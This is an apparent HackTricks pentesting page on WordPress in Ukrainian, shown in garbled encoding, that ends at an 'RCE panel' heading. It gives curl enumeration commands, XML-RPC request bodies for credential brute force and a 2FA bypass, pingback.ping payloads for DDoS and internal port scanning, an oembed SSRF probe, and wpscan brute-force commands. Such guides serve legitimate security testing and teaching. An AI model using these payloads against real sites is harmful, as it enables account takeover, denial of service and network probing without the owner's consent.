# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

- **Uploaded** —Ñ–∞–π–ª–∏ –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å —É: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** —Ç–æ–º—É —è–∫—â–æ –≤–∏ –∑–º—ñ–Ω–∏—Ç–µ —è–∫–∏–π—Å—å php —Ç–µ–º–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –≤–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —à–ª—è—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **theme twentytwelve** –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—É **404.php** –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- –£ **wp-config.php** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ root-–ø–∞—Ä–æ–ª—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
- –®–ª—è—Ö–∏ –¥–ª—è –≤—Ö–æ–¥—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —è–∫—ñ –≤–∞—Ä—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –≤–µ—Ä—Å—ñ—é –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ WordPress.
- `wp-activate.php` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ email –ø—Ä–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ —Å–∞–π—Ç—É WordPress.
- –ü–∞–ø–∫–∏ –¥–ª—è –ª–æ–≥—ñ–Ω—É (–º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ –¥–ª—è –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ‚Äî —Ñ–∞–π–ª, —è–∫–∏–π —Ä–µ–∞–ª—ñ–∑—É—î —Ñ—É–Ω–∫—Ü—ñ—é WordPress, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º HTTP —è–∫ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç–Ω–æ–≥–æ –º–µ—Ö–∞–Ω—ñ–∑–º—É —Ç–∞ XML —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—è. –¶–µ–π —Ç–∏–ø –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –±—É–≤ –∑–∞–º—ñ–Ω–µ–Ω–∏–π WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- –ü–∞–ø–∫–∞ `wp-content` ‚Äî —Ü–µ –≥–æ–ª–æ–≤–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏.
- `wp-content/uploads/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –∫—É–¥–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤—Å—ñ —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É.
- `wp-includes/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –æ—Å–Ω–æ–≤–Ω—ñ —Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —à—Ä–∏—Ñ—Ç–∏, JavaScript-—Ñ–∞–π–ª–∏ —Ç–∞ –≤—ñ–¥–∂–µ—Ç–∏.
- `wp-sitemap.xml` –£ WordPress –≤–µ—Ä—Å—ñ—è—Ö 5.5 —ñ –≤–∏—â–µ, WordPress –≥–µ–Ω–µ—Ä—É—î sitemap XML —Ñ–∞–π–ª –∑ —É—Å—ñ–º–∞ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏ —Ç–∞ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ —Ç–∏–ø–∞–º–∏ –∑–∞–ø–∏—Å—ñ–≤ —ñ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—è–º–∏.

**Post exploitation**

- –§–∞–π–ª `wp-config.php` –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É WordPress –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫—É —è–∫ –Ω–∞–∑–≤–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ö–æ—Å—Ç –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å, authentication keys and salts, —Ç–∞ –ø—Ä–µ—Ñ—ñ–∫—Å —Ç–∞–±–ª–∏—Ü—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó DEBUG —Ä–µ–∂–∏–º—É, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –ø—Ä–∏ —É—Å—É–Ω–µ–Ω–Ω—ñ –Ω–µ—Å–ø—Ä–∞–≤–Ω–æ—Å—Ç–µ–π.

### –ü—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

- **Administrator**
- **Editor**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –π —á—É–∂–∏–º–∏ –ø—É–±–ª—ñ–∫–∞—Ü—ñ—è–º–∏
- **Author**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î –≤–ª–∞—Å–Ω–∏–º–∏ –ø—É–±–ª—ñ–∫–∞—Ü—ñ—è–º–∏
- **Contributor**: –ü–∏—à–µ —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –ø—É–±–ª—ñ–∫–∞—Ü—ñ—è–º–∏, –∞–ª–µ –Ω–µ –º–æ–∂–µ —ó—Ö –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏
- **Subscriber**: –ü–µ—Ä–µ–≥–ª—è–¥–∞—î –ø–æ—Å—Ç–∏ —Ç–∞ —Ä–µ–¥–∞–≥—É—î —Å–≤—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å

## **Passive Enumeration**

### **Get WordPress version**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ `/license.txt` –∞–±–æ `/readme.html`

–£ **–≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ** —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–ø—Ä–∏–∫–ª–∞–¥ –∑ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- –§–∞–π–ª–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è CSS

![](<../../images/image (533).png>)

- –§–∞–π–ª–∏ JavaScript

![](<../../images/image (524).png>)

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–µ–º
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –ó–∞–≥–∞–ª—å–Ω–µ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–µ—Ä—Å—ñ–π
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## –ê–∫—Ç–∏–≤–Ω–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

### –ü–ª–∞–≥—ñ–Ω–∏ —Ç–∞ –¢–µ–º–∏

–í–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ. –©–æ–± –≤–∏—è–≤–∏—Ç–∏ —ó—Ö —É—Å—ñ, –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∞–∫—Ç–∏–≤–Ω–æ Brute Force —Å–ø–∏—Å–æ–∫ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —Ç–∞ —Ç–µ–º** (–Ω–∞ —â–∞—Å—Ç—è, —ñ—Å–Ω—É—é—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å —Ü—ñ —Å–ø–∏—Å–∫–∏).

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

- **ID Brute:** –í–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –¥—ñ–π—Å–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ WordPress-—Å–∞–π—Ç—É —à–ª—è—Ö–æ–º Brute Forcing ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
–Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ ‚Äî **200** –∞–±–æ **30X**, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ id ‚Äî **–≤–∞–ª—ñ–¥–Ω–∏–π**. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å ‚Äî **400**, —Ç–æ id ‚Äî **–Ω–µ–≤–∞–ª—ñ–¥–Ω–∏–π**.

- **wp-json:** –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑—Ä–æ–±–∏–≤—à–∏ –∑–∞–ø–∏—Ç:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
–©–µ –æ–¥–∏–Ω endpoint `/wp-json/`, —è–∫–∏–π –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –±—É–¥–µ –Ω–∞–¥–∞–Ω–∞ –ª–∏—à–µ –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —è–∫–∏—Ö —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è —É–≤—ñ–º–∫–Ω–µ–Ω–∞**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: –ø—ñ–¥ —á–∞—Å –≤—Ö–æ–¥—É —á–µ—Ä–µ–∑ **`/wp-login.php`** **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** **–≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è** —ñ –≤–∫–∞–∑—É—î, **—á–∏ —ñ—Å–Ω—É—î —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —á–∏ –Ω—ñ**.

### XML-RPC

–Ø–∫—â–æ `xml-rpc.php` –∞–∫—Ç–∏–≤–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ brute-force –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–ø—É—Å–∫—É DoS –∞—Ç–∞–∫ –Ω–∞ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏. (–í–∏ –º–æ–∂–µ—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å[ using this](https://github.com/relarizky/wpxploit) –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–Ω –∞–∫—Ç–∏–≤–Ω–∏–π, —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ _**/xmlrpc.php**_ —Ç–∞ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —Ç–∞–∫–∏–π –∑–∞–ø–∏—Ç:

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** —î –¥–µ—è–∫–∏–º–∏ –∑ –º–µ—Ç–æ–¥—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è brute-force credentials. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è _"Incorrect username or password"_ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 200 –º–∞—î –∑'—è–≤–ª—è—Ç–∏—Å—è, —è–∫—â–æ credentials –Ω–µ–¥—ñ–π—Å–Ω—ñ.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ credentials, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª. –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑'—è–≤–∏—Ç—å—Å—è —à–ª—è—Ö ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º, –∞ –Ω–µ –¥–ª—è –ª—é–¥–µ–π, —ñ –¥–æ–≤–æ–ª—ñ —Å—Ç–∞—Ä–∏–π, —Ç–æ–º—É –≤—ñ–Ω –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2FA. –û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –≤–∞–ª—ñ–¥–Ω—ñ creds, –∞–ª–µ –≥–æ–ª–æ–≤–Ω–∏–π –≤—Ö—ñ–¥ –∑–∞—Ö–∏—â–µ–Ω–∏–π 2FA, **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ xmlrpc.php —â–æ–± —É–≤—ñ–π—Ç–∏ –∑ —Ü–∏–º–∏ creds, –æ–±—Ö–æ–¥—è—á–∏ 2FA**. –ó–∞—É–≤–∞–∂—Ç–µ, —â–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –≤—Å—ñ –¥—ñ—ó, –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å, –∞–ª–µ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, —è–∫ –ø–æ—è—Å–Ω—é—î Ippsec —É [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –º–µ—Ç–æ–¥ _**pingback.ping**_ —É —Å–ø–∏—Å–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Wordpress –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –±—É–¥—å-—è–∫–∏–π —Ö–æ—Å—Ç/–ø–æ—Ä—Ç.\
–¶–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **—Ç–∏—Å—è—á—ñ** —Å–∞–π—Ç—ñ–≤ **Wordpress** –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –æ–¥–Ω—ñ—î—ó **–ª–æ–∫–∞—Ü—ñ—ó** (—É–Ω–∞—Å–ª—ñ–¥–æ–∫ —á–æ–≥–æ —Ç–∞–º —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å—Å—è **DDoS**), –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **Wordpress** –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏ —è–∫—É—Å—å –≤–Ω—É—Ç—Ä—ñ—à–Ω—é **–º–µ—Ä–µ–∂—É** (–≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ **faultCode** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º **–±—ñ–ª—å—à–∏–º** –∑–∞ **0** (17), —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`system.multicall`** —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

–¶–µ–π —Ñ–∞–π–ª –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–æ—Ä–µ–Ω—ñ —Å–∞–π—Ç—É Wordpress: **`/wp-cron.php`**\
–ö–æ–ª–∏ —Ü–µ–π —Ñ–∞–π–ª **accessed**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è "**heavy**" MySQL **query**, —Ç–æ–∂ –π–æ–≥–æ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **attackers** –¥–ª—è **cause** **DoS**.\
–¢–∞–∫–æ–∂ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `wp-cron.php` –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –±—É–¥—å-—è–∫—É —Å—Ç–æ—Ä—ñ–Ω–∫—É Wordpress), —â–æ –Ω–∞ —Å–∞–π—Ç–∞—Ö –∑ –≤–µ–ª–∏–∫–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –º–æ–∂–µ —Å–ø—Ä–∏—á–∏–Ω—è—Ç–∏ –ø—Ä–æ–±–ª–µ–º–∏ (DoS).

–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤—ñ–¥–∫–ª—é—á–∏—Ç–∏ Wp-Cron —ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∞–ª—å–Ω–∏–π cronjob –Ω–∞ —Ö–æ—Å—Ç—ñ, —è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏–º–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥—ñ—ó –∑ —Ä–µ–≥—É–ª—è—Ä–Ω–∏–º —ñ–Ω—Ç–µ—Ä–≤–∞–ª–æ–º (–±–µ–∑ –≤–∏–∫–ª–∏–∫–∞–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º).

### /wp-json/oembed/1.0/proxy - SSRF

–°–ø—Ä–æ–±—É–π—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ —ñ Worpress site –º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –≤–∞—Å.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ —ñ—Å–Ω—É—î **methodName: pingback.ping** —Ç–∞ —à–ª—è—Ö **/wp-json/oembed/1.0/proxy**, —ñ —è–∫—â–æ –≤–æ–Ω–∏ —î, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —ó—Ö –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## –û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –±—ñ—Ç–∞

–°–∫–æ—Ä—ñ—à–µ —Ü—ñ–∫–∞–≤–∏–Ω–∫–∞, –Ω—ñ–∂ —Ä–µ–∞–ª—å–Ω–∞ –∞—Ç–∞–∫–∞. –£ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) –≤–∏ –º–æ–≥–ª–∏ –ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç–∏ 1 –±—ñ—Ç —É –±—É–¥—å-—è–∫–æ–º—É wordpress —Ñ–∞–π–ª—ñ. –¢–æ–±—Ç–æ –º–æ–∂–Ω–∞ –±—É–ª–æ –∑–º—ñ–Ω–∏—Ç–∏ –ø–æ–∑–∏—Ü—ñ—é `5389` —É —Ñ–∞–π–ª—ñ `/var/www/html/wp-includes/user.php`, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ NOP –¥–ª—è –æ–ø–µ—Ä–∞—Ü—ñ—ó NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **–ü–∞–Ω–µ–ª—å RCE**

